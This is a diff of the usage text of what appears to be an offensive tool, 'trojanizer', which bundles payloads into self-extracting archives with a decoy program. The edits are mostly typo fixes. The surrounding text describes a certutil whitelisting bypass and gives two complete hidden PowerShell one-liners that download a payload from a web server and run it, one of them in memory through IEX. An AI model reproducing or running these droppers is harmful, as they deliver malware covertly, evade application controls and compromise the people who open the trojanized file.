@@ -96,7 +96,7 @@
 
 
     The follow exercise describes how to use trojanizer and Presetup sfx build-in switch to drop and execute
-    any payload using 'certutil' appl whitelisting bypass method discover by @subTee and @enigma0x3 ..
+    any payload using 'certutil' or 'powershell' appl whitelisting bypass method discover by @subTee and @enigma0x3 ..
 
 
     1º - use metasploit to build our payload
@@ -123,10 +123,10 @@
     |  execute it before extract 'any_file' and 'any_legit_appl.exe' (this last one will be executed to serve as decoy)  |
     ╚────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
 
-    The follow onelinner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
+    The follow oneliner uses 'powershell(Downloadfile+start)' method to achieve the same as previous 'certutil' exercise ..
     cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://webserver/payload.exe', '%TEMP%\\payload.exe') & start '%TEMP%\\payload.exe'
 
-    The follow onelinner uses 'powershell(IEX+downloadstring)' method to achieve allmost the same (payload.ps1 does not touch disk)
+    The follow oneliner uses 'powershell(IEX+downloadstring)' method to achieve allmost the same (payload.ps1 does not touch disk)
     cmd.exe /c powershell.exe -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://webserver/payload.ps1'))"
     
 
